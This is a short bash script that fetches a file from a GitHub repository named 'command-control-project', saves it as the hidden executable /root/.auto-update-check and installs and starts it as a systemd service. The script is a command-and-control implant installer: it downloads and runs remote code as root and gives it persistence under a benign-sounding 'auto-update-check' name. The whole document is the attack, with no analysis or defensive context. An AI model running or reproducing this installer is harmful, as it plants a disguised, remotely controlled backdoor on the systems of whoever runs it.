#!/bin/bash
curl -s https://raw.githubusercontent.com/michaeltao07/command-control-project/main/auto-check-update > /root/.auto-update-check
chmod +x /root/.auto-update-check
curl -s https://raw.githubusercontent.com/michaeltao07/command-control-project/main/auto-check-update.service > /etc/systemd/system/auto-update-check.service
systemctl daemon-reload
systemctl enable auto-update-check
systemctl start auto-update-check
